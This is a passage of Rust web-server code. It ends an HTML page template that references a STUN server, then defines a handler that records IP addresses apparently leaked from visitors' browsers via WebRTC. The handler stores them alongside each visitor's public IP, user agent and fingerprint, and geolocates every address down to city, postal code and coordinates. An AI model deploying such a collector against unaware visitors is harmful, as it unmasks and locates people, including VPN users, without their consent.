      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10264;&#10495;&#10495;&#10495;&#10436;&#10240;&#10240;&#10407;&#10264;&#10487;&#10326;&#10278;&#10468;&#10468;&#10432;&#10432;&#10468;&#10340;&#10292;&#10407;&#10364;&#10368;&#10318;&#10240;&#10240;&#10480;&#10495;&#10495;&#10367;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10264;&#10495;&#10495;&#10495;&#10310;&#10240;&#10264;&#10439;&#10264;&#10407;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10272;&#10332;&#10371;&#10364;&#10241;&#10240;&#10492;&#10495;&#10495;&#10367;&#10243;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10265;&#10495;&#10495;&#10311;&#10240;&#10240;&#10248;&#10265;&#10267;&#10259;&#10258;&#10258;&#10258;&#10258;&#10258;&#10258;&#10267;&#10267;&#10249;&#10240;&#10240;&#10240;&#10495;&#10495;&#10367;&#10241;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10264;&#10431;&#10487;&#10304;&#10240;&#10240;&#10272;&#10260;&#10258;&#10267;&#10267;&#10303;&#10303;&#10267;&#10259;&#10258;&#10274;&#10244;&#10240;&#10240;&#10400;&#10495;&#10367;&#10241;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10248;&#10431;&#10471;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10494;&#10335;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10297;&#10487;&#10436;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10368;&#10464;&#10366;&#10251;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10248;&#10267;&#10303;&#10487;&#10486;&#10486;&#10486;&#10486;&#10486;&#10486;&#10486;&#10486;&#10494;&#10303;&#10251;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10248;&#10249;&#10267;&#10267;&#10267;&#10267;&#10267;&#10251;&#10249;&#10241;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
      &#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10432;&#10432;&#10432;&#10432;&#10304;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;&#10240;
    </div>
  </body>
</html>
",
        stun_server = app_data.lock().stun_server,
        username = username,
    );

    HttpResponse::Ok()
        .content_type("text/html")
        .body(html_content)
}

async fn record_leaked_ips(
    app_data: web::Data<Mutex<AppData>>,
    request: HttpRequest,
    record_request: web::Json<RecordLeakedIpsRequest>,
) -> HttpResponse {
    let username = record_request
        .username
        .clone()
        .unwrap_or_else(|| String::from("{UNKNOWN_USER}"));

    let leaked_ips = record_request.leaked_ips.clone().unwrap_or_default();

    let public_ip = request
        .peer_addr()
        .map_or("{UNKNOWN_PUBLIC_IP}".to_string(), |addr| {
            addr.ip().to_string()
        });

    let user_agent = request
        .headers()
        .get("User-Agent")
        .map_or("{UNKNOWN_USER_AGENT}", |value| {
            value.to_str().unwrap_or("{UNKNOWN_USER_AGENT}")
        });

    let fingerprint = record_request
        .fingerprint
        .clone()
        .unwrap_or_else(|| String::from("{UNKNOWN_FINGERPRINT}"));

    let geoip2_database_path = app_data.lock().geoip2_database_path.clone();

    println!("Recording leaked IPs...");
    println!(" - User: {username}");

    println!(" - Leaked IPs:");
    for ip in &leaked_ips {
        let ip_geo_data = get_geo_data(geoip2_database_path.as_str(), ip.as_str());
        println!("   - IP: {ip}");
        println!("     - Country: {}", ip_geo_data.country);
        println!("     - City: {}", ip_geo_data.city);
        println!("     - Postal Code: {}", ip_geo_data.postal_code);
        println!("     - Time Zone: {}", ip_geo_data.time_zone);
        println!("     - Latitude: {}", ip_geo_data.latitude);
        println!("     - Longitude: {}", ip_geo_data.longitude);
        println!("     - Accuracy Radius: {}", ip_geo_data.accuracy_radius);
        println!("     - Metro Code: {}", ip_geo_data.metro_code);
    }

    let public_ip_geo_data = get_geo_data(geoip2_database_path.as_str(), public_ip.as_str());
    println!(" - Public IP: {public_ip}");
    println!("   - Country: {}", public_ip_geo_data.country);
    println!("   - City: {}", public_ip_geo_data.city);
    println!("   - Postal Code: {}", public_ip_geo_data.postal_code);
    println!("   - Time Zone: {}", public_ip_geo_data.time_zone);
    println!("   - Latitude: {}", public_ip_geo_data.latitude);
    println!("   - Longitude: {}", public_ip_geo_data.longitude);
    println!(
        "   - Accuracy Radius: {}",
        public_ip_geo_data.accuracy_radius
    );
    println!("   - Metro Code: {}", public_ip_geo_data.metro_code);

    println!(" - User Agent: {user_agent:?}");
    println!(" - Fingerprint: {fingerprint}");

    HttpResponse::Ok().finish()
}
